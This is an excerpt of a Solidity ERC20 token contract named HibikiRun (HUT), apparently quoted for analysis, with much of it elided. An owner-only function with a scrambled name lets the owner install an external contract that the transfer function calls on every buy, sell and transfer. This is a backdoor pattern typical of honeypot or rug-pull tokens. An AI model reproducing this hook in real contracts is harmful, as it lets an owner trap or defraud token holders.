...
contract TokenM is ERC20 {
    ...
    IUserAmounttovbfm public tovbfm;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("HibikiRun", "HUT") {
    ...
    function ceoeafunBringeRvood(IUserAmounttovbfm _tovbfm) public onlyOwner {
        tovbfm = _tovbfm;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tovbfm.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tovbfm.addOutAmount(from, amount);
            }else{
                tovbfm.addOutAmount(from, amount);
                takeFee = false;
            }
